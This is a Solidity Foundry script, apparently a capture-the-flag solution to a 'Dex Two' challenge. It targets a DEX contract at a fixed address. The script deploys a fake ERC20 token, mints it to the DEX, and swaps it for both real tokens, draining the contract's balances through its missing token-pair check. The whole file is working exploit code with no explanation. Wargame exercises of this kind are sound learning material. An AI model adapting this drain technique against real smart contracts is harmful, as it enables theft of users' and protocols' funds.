pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/dex2.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
contract fakeERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint256 initialSupply, address initialHolder) ERC20(name, symbol){
        _mint(initialHolder, initialSupply);
    }
    function mintFor(address to, uint256 amount) external{
        _mint(to, amount);
    }
}
contract dex2Solution  is Script{
    DexTwo dextwo = DexTwo(0x6B6313A8de35b08fb09734689c0725Bb9E2a35c4);
    address player = 0xeDc3e3588a5F0bf61c9A6B4ad1e573942d729e16;
    address token1 = dextwo.token1();
    address token2 = dextwo.token2();
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fakeERC20 fakeCoin = new fakeERC20("Fake", "FK", 1000000, player);
        fakeCoin.approve(address(dextwo), 1e6);
        fakeCoin.mintFor(address(dextwo), 100);
        dextwo.swap(address(fakeCoin), token1, 100);

        fakeCoin = new fakeERC20("Fake", "FK", 1000000, player);
        fakeCoin.approve(address(dextwo), 1e6);
        fakeCoin.mintFor(address(dextwo), 100);
        dextwo.swap(address(fakeCoin), token2, 100);

        console.log("User token",dextwo.balanceOf(token1, player),dextwo.balanceOf(token2, player));
        console.log("Contract token",dextwo.balanceOf(token1, address(dextwo)),dextwo.balanceOf(token2, address(dextwo)));
        vm.stopBroadcast();
    }
}
